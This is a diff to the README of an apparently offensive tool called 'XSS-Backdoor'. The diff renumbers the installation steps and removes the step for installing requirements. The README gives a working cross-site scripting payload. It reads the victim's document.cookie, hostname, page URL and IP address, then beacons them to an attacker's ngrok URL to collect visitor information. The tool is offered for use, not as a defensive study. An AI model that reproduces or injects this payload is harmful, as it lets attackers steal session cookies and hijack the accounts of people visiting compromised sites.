@@ -24,16 +24,12 @@ pip install flask pyngrok colorama user-agents
    git clone https://github.com/SenselessCore/XSS-Backdoor.git
    cd XSS-Backdoor
    ```
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. Run the script:
+2. Run the script:
    ```bash
    python main.py
    ```
-4. The script will generate an `ngrok` URL, which can be used to collect visitor information.
-5. Payload URL:
+3. The script will generate an `ngrok` URL, which can be used to collect visitor information.
+4. Payload URL:
    ```html
    <script>fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"_").then(ip=>{new Image().src="NGROK_URL/?"+document.cookie+"&host="+location.hostname+"&url="+encodeURIComponent(location.href)+"&ip="+ip})</script>
 
